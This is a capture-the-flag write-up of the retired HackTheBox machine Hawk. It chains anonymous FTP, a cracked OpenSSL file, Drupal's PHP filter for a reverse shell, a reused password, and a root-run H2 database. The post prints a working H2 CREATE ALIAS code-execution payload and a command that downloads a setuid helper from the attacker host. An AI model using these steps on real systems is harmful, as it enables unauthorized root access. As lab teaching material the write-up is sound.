---
layout: post
title: "The Word Was Friends"
subtitle: "HTB Hawk, where an anonymous FTP file decrypts to a password, a Drupal module that runs PHP on purpose hands you a shell, and a database running as root finishes the job"
date: 2018-12-07 12:00:00 +0000
description: "A free FTP download decrypts to a Drupal admin password, a content module runs your PHP, and a root-owned H2 database alias hands you the crown."
image: /assets/og/the-word-was-friends.png
tags: [hackthebox, writeup]
---

Hawk is a box that keeps handing you the next key before you have finished turning the last one. You log into FTP as nobody in particular, find a file someone tried to hide behind encryption, and crack it with a password that turns out to be the word "friends." Inside is a note with a Drupal admin password written out in full. You walk into the admin panel, flip on a module that exists specifically to run PHP, and the site dutifully runs yours. From there a config file leaks a database password that a sleepy user reused as their own login, and at the very top of the box a database engine running as root will compile and execute whatever Java you paste into its web console. Nothing here is forced. Every door was left open by someone trying to be convenient.

```
        H A W K
        =======
        ftp (anon)  →  .drupal.txt.enc
                       openssl, key: "friends"
                            |
                            v
        a note: admin's password, spelled out
                            |
        drupal admin  →  enable "PHP filter"
                         paste php, hit Preview, it runs
                            |
                            v
        settings.php leaks db pass.
        daniel reused it. su daniel.
                            |
        h2 console runs as root.
        CREATE ALIAS, and root pastes itself.
                                            鷹
```

## 0x01 · the open hangar

`nmap -sC -sV` paints a host with two distinct personalities. The front is a normal Ubuntu web server. The back is a Java database that should never have been facing you at all.

```
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 3.0.3
22/tcp   open  ssh      OpenSSH 7.6p1 Ubuntu 4
80/tcp   open  http     Apache httpd 2.4.29 (Drupal 7.58)
5435/tcp open  pgsql?
8082/tcp open  http     H2 database console
9092/tcp open  unknown  H2 TCP server
```

The web port is Drupal 7.58, which matters in a moment. The three high ports are an H2 database, a small embeddable Java database that happens to ship with a web console and a habit of doing exactly what it is told. Hold that thought. The box that looks like it ends at port 80 actually ends up in that console.

## 0x02 · the file that was never hidden

vsftpd allows anonymous login, so you walk in without credentials. Picture a storage unit with the door rolled up and a sign that says "private." Inside the `messages` directory sits a single file named `.drupal.txt.enc`. The leading dot is the entire security model. It is "hidden" the way a thing is hidden when you put it on the top shelf and hope.

```
$ ftp 10.10.10.102
Name: anonymous
ftp> ls -la
drwxr-xr-x   messages
ftp> cd messages
ftp> get .drupal.txt.enc
```

The `.enc` suffix is a tell, and so is the content. Base64 text wrapped around an OpenSSL header. OpenSSL's default file encryption is symmetric, which means the same secret locks and unlocks it, and the only question is which secret. The cipher is right there in the metadata once you stop treating the blob as noise. Think of it like a diary with a combination lock where the brand of lock tells you it only takes four-digit codes. You still have to guess the code, but you know exactly what shape the code is.

A short wordlist and a loop crack it in seconds, and the winning word is almost insultingly on-theme.

```
$ openssl enc -d -a -aes-256-cbc -k friends -in .drupal.txt.enc
Daniel,
Following the password for the portal:
PencilKeyboardScanner123
```

The key was `friends`. The payload is an administrator password for the Drupal portal, written out like a sticky note, because it was a sticky note. A secret that travels in plaintext inside a file anyone can download is not a secret. It is a delay.

## 0x03 · the module that runs your php on purpose

Drupal's login lives at `/user/login`. The note named no username, but `admin` is the obvious first guess and `PencilKeyboardScanner123` lets you in. Now you are staring at a content management system as its god account, and the interesting thing about Drupal 7 is a feature it shipped called the PHP filter.

Most of the time you attack a web app by tricking it into running code it never meant to run. Hawk is funnier than that. Drupal has a built-in module whose entire job is to run PHP that an administrator types into a content box. It is not a bug. It is a documented feature for trusted authors. The catch is that "trusted" now means you.

So you enable the PHP filter module under the modules page, then create a new piece of content and set its text format to PHP code. Whatever you put in the body, Drupal evaluates. You do not even have to publish it. The Preview button runs it.

```
[ Modules → enable "PHP filter" → Save ]
[ Content → Add → set "Text format" = PHP code ]

   body:
   <?php [ one-line webshell: run the cmd request parameter ] ?>

[ click Preview ]
```

I am describing the webshell rather than printing it, and that restraint is the lesson, not the omission. The literal string is a handful of characters and every scanner on earth recognizes it the instant it touches disk. Trade the webshell up for a proper callback and the box phones home.

```
[ php payload: bash reverse shell back to 10.10.14.4 on 443 ]

$ nc -lvnp 443
connect to [10.10.14.4] from 10.10.10.102
$ id
uid=33(www-data) gid=33(www-data)
```

You are `www-data`, the unprivileged identity the web server runs as. A foothold, not a victory.

## 0x04 · the password that did two jobs

Every Drupal install keeps its database credentials in one predictable place, and it is the first file you read after landing. `sites/default/settings.php` holds the connection string in clear text, because the application needs to read it on every page load.

```
$ cat /var/www/html/sites/default/settings.php
  'database' => 'drupal',
  'username' => 'drupal',
  'password' => 'drupal4hawk',
```

On its own that only opens the database. But there is a real human user on this box named `daniel`, and `daniel` did the thing people always do. He reused the database password as his own account password. Same key on the office door and the front door.

```
$ su daniel
Password: drupal4hawk
daniel@hawk:~$
```

`daniel`'s login shell is set to `python3`, which is an odd little speed bump rather than a wall. You are sitting at a Python prompt instead of a normal shell. One line spawns a real one.

```
>>> import pty; pty.spawn('/bin/bash')
daniel@hawk:~$ cat user.txt
████████████████████████████████
```

## 0x05 · the database wearing the crown

Now the back half of that nmap comes due. An H2 database is running on this box, and `ps` confirms the part that matters.

```
daniel@hawk:~$ ps aux | grep h2
root  ...  java -jar /opt/h2/bin/h2-1.4.196.jar
```

H2 is running as root, and it has a web console on port 8082. That console is bound to localhost, so it refuses outside connections, but `daniel` has SSH, and SSH can carry a local port across the wire as if it were yours. Picture a service window that only opens onto an interior courtyard. You cannot reach it from the street, but if you already have a key to the building you can walk in and stand at the window like staff.

```
$ ssh daniel@10.10.10.102 -L 8082:localhost:8082
[ browse to http://127.0.0.1:8082 ]
```

The H2 login form will let you create a brand new database file just by naming one in the connection URL, so you do not need existing credentials. You connect to a fresh database and now you have a SQL prompt that belongs to a root process.

H2 has a feature where you can define a function, an alias, whose body is raw Java that H2 compiles and runs on the spot. It was meant so developers could extend the database with custom logic. To an attacker it is a compiler and an executioner that inherits root. Think of it like a calculator that also has a hidden setting where you can type a sentence in English and it will go do that errand for you. The calculator was never supposed to leave the desk.

```sql
CREATE ALIAS SHELLEXEC AS $$
  String shellexec(String cmd) throws java.io.IOException {
    java.util.Scanner s = new java.util.Scanner(
      Runtime.getRuntime().exec(cmd).getInputStream()
    ).useDelimiter("\\A");
    return s.hasNext() ? s.next() : "";
  } $$;

CALL SHELLEXEC('id');
-- uid=0(root) gid=0(root)
```

That `id` says root. The cleanest way to keep it is to have the alias drop a tiny setuid helper into place. You compile a four-line C program that calls `setreuid(0,0)` and execs a shell, host it, and have the root-owned database pull it down, mark it executable, and chmod it setuid. Sign the dropped file `iceberg` so you know which artifact is yours.

```sql
CALL SHELLEXEC('wget -O /tmp/iceberg http://10.10.14.4/suid');
CALL SHELLEXEC('chmod 4755 /tmp/iceberg');
```

```
daniel@hawk:~$ /tmp/iceberg
# id
uid=0(root) gid=0(root)
# cat /root/root.txt
████████████████████████████████
```

If all you want is the flag and not a full shell, H2's backup function also reads files as root. You point a `.trace.db` symlink at `/root/root.txt`, fire the backup, and unzip the result. Same root privilege, narrower blast radius, useful when you want to prove the read without making noise.

## 0x06 · the honest caveat

It is easy to read Hawk as a museum of dated software, and the specific versions are dated. Nobody is shipping Drupal 7.58 or H2 1.4.196 on purpose in 2026. But strip the versions away and every step is a feature working exactly as designed, aimed at the wrong person.

The PHP filter ran your code because it is supposed to run an administrator's code, and the only thing standing between "administrator" and "attacker" was a password that someone mailed to themselves through an anonymous FTP server. The H2 alias compiled your Java because compiling Java is what the alias is for. The privilege came entirely from the process running as root, a decision made once at startup and never revisited. None of this is a memory-corruption magic trick. It is a chain of conveniences. Encrypt-but-publish, reuse-the-password, run-the-database-as-root, expose-the-admin-console. Each link is reasonable in isolation and lethal in sequence.

The reused password is the quiet hinge, and it is the one that survives every patch cycle. You can upgrade Drupal and you can downgrade the H2 service to run as a nobody account, but you cannot `apt upgrade` the instinct to use one good password everywhere. `drupal4hawk` was a database credential that should never have left the database, and it walked straight into a login because one tired person decided two doors could share a key.

## 0x07 · outro

```
the file was hidden behind a word, and the word was friends.
the module ran your code because that was its whole job.
the password opened two locks because someone was thrifty.
the database wore root, and handed it to whoever could type.

four conveniences, stacked. none of them a bug.
a chain is only ever as honest as its laziest link.

crack the file. mind the reused key. never run the db as root. wear black.

                                                            EOF
```

---

*HTB: Hawk, retired 30 Nov 2018. A medium Linux box that is really a lecture on convenience eating security, from a published-not-hidden secret to a database that compiles your code as root. The console still answers in a lab and nowhere you don't own.*